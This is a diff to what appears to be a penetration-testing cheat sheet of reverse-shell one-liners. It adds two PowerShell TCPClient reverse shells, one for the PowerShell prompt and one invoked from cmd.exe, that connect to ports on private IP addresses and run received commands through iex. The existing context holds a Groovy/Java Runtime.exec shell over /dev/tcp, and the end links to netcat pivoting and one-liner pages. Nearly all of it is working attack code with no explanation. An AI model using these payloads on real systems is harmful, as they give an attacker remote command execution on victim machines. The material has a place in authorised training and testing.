@@ -63,6 +63,18 @@ r = Runtime.getRuntime()
 p = r.exec([“/bin/bash”,”-c”,”exec 5<>/dev/tcp/192.168.1.142/80;cat <&5 | while read line; do \$line 2>&5 >&5; done”] as String[])
 p.waitFor()
 
+
+6.Powershell
+execute from powershell prompt:
+>$client = New-Object System.Net.Sockets.TCPClient('172.17.0.2',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+exeute from cmd.exe:
+>powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.2',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+ 
+
+
 ==========================================
 pivot attack:
 https://www.hackingtutorials.org/networking/hacking-with-netcat-part-3-advanced-techniques/
+
+https://hackersinterview.com/oscp/reverse-shell-one-liners-oscp-cheatsheet/
